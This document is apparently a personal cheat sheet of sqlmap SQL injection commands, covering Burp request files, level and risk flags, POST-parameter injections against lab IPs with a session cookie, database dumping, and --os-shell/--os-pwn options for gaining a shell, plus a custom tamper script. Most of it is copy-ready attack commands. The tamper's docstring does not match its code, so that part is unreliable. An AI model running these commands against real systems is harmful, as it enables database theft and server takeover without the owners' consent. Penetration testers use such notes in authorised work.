# SQLMap

[ sqlmap ]
https://tools.kali.org/vulnerability-analysis/sqlmap

[ + ] SQLMAP AND POST DATA:
--> Intercept HTTP POST request in Burp.
--> touch request.txt
--> nano request.txt
--> paste.
--> Remove each additional \r\n (Carriage Return & Newline Data - usually just an empty space after each header...)
--> sqlmap -r request.txt

[ + ] Optionally:
--> --dbms=mysql (Specify the Database Management System to save a LOT of time with SQLMAP...)
--> --threads=2 (Specify more threads if you wish - I find two to be fine.)
--> --time-sec=10 (In the event of time-based SQLi Queries - make the sleep time to 10 seconds...)
--> --level=2 (Specify the level for SQLMAP - it goes to a maximum of 5 levels.)
--> --risk=2 (Risk goes up to 3 at max.)
--> --technique=T (This will specify for any Time-Based versus a value of 'B' which would be "Boolean Based" heavy stack queries.)
--> --force-ssl (Some modern databases themselves require SSL Protocol.)
--> --dbs (Extract a Database Name)
--> -D <database name> (Found a Database Name? Tell SQLMap which one you're interested in.)

[ + ] All Together for request.txt:
sqlmap -r request.txt
sqlmap -r request.txt --threads=2
sqlmap -r request.txt --threads=2 --time-sec=10
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --force-ssl
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --force-ssl --dump
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --force-ssl --os-shell
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --force-ssl --os-pwn

[ + ] On your URL Environment Variable :
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
--> or
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=B --force-ssl

[ + ] Need to specify the DMBS?
--dbms=<DBMS>
--dbms=mysql
--dbms=mssql
--> etc.

[ + ] Dump all data we get please to the terminal please.
--dump

[ + ] If the DBMS is configured to permit I/O Operations (Specifically Output). - Shell
--os-shell

[ + ] Specify a specific parameter to Test (i.e. I want to test parameter9 rather than parameters1-8 as I know that's where the injection point is already).
-->export URL="http://127.0.0.1:80/superDuperCMS.php?p1=DATA&p2=DATA&p3=DATA&p4=INJECTABLE-POINT
sqlmap -u $URL --threads=2 --risk=2 --level=3 --dbms=<DBMS> -p p4


# SQLMapExamples
A list of sample SQL Map Injection Commands.  SQLMap is a powerful tool for identifying SQL injection vulnerabilities.  However, everytime I use it, I struggle with the parameters.  The following is a list of SQLMap one-liners that I have used in the past and keep here so I can copy and paste and modify the parameters are required.

Reference:
https://github.com/sqlmapproject/sqlmap/wiki/Usage

## SQLMap and BurpSuite
These days, all the cool kids will use a Request file generated from a proxy like BurpSuite to save a bunch of parameter typing.
In burpsuite, when you are viewing a request in the proxy -> intercept tab, you can right click on the request and select "Copy to file" and save the request to a local file.
Next you can point SQLMap to that request file using the -r parameter:
```bash
sqlmap -r request.req --dump --batch
```

This can save you having to dial in all the parameters to setup our SQL injection.

## SQLMap Injection on POST parameter with a PHP Session ID
Here we have simple sql injection test agianst a single POST parameter
```bash
sqlmap -u "http://10.10.10.10/profile.php" --data="name=1234567890" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --delay=0 --timeout=30 --retries=0 --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N"
```

## SQLMap Injection on POST parameter at a particular position using the astrix (*) notation
Here is the same injection attack as above but using the astrix to inject at a predetermined postion for a MySQL database running on a Linux platform:
```bash
sqlmap -u "http://10.10.10.10/profile.php" --data="name=1234567890*" --method="POST" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --delay=0 --timeout=30 --retries=0 --dbms="MySQL" --os=Linux --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N"
```


## SQLMap Injection on POST parameter at a particular position using the astrix (*) notation
Here is a SQL injection attack which has been configured to run through a Proxy (BurpSuite)

```bash
sqlmap -u "http://10.10.10.10/rofile.php" --data="name=1234567890*" --method="POST" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --proxy=http://127.0.0.1:8080 --delay=0 --timeout=30 --retries=0 --dbms="MySQL" --os=Linux --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N"
```

## SQLMap test only 1 parameter "name" and risk 3 level 5 through a proxy connection
Here is a sql injection on a name parameter for a login form at a set position on the name field. Also there is a custom written tamper (that is included in this repository) that will replace <here> with 3 random characters, so that a unique user is created with each SQLMap injection test.
You can  install this tamper simply by coping the file to your /usr/share/sqlmap/tamper folder (on Kali at least)

```bash
sqlmap -u "http://10.10.10.10:80/index.php" --data="name=12345678901*&email=test<here>@test.com&password=test12345" --method="POST" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --proxy=http://127.0.0.1:8080 --delay=0 --timeout=30 --retries=0 -p "name" --dbms="MySQL" --os=Linux --level=5 --risk=3 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N" --tamper=chargen.py
```

**Chergen.py code is below**

## SQLMap test only blind timing based SQL injection techniques
Testing only the timing based attacks using the --technique=T parameter
```
sqlmap -u "http://10.10.10.10/profile.php" --data="name=1234567890*" --method="POST" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --proxy=http://127.0.0.1:8080 --delay=0 --timeout=30 --retries=0 --dbms="MySQL" --os=Linux --level=5 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N" --technique=T
```

## Create a custom SQLMap tamper file
I ran into a scenario today where I wanted to test a SQL create new user page for a SQL injection.
Tampers can be easily edited and replaced here:
`cd /usr/share/sqlmap/tamper`
`sudo cp lowercase.py increment.py`


```
#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re
import random
import string

from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    replaces <here> with 3 random generated chars - helpful when we need to generate unique entries for user names
    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0
    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that has poorly written permissive regular expressions
    >>> tamper('INSERT')
    'insert'
    """

    retVal = payload
    if payload:
        all_ascii_letters = string.ascii_letters
        random_chars = ''.join(random.choice(all_ascii_letters) for i in range(3))
        retVal = retVal.replace("<here>",random_chars)
    return retVal
```
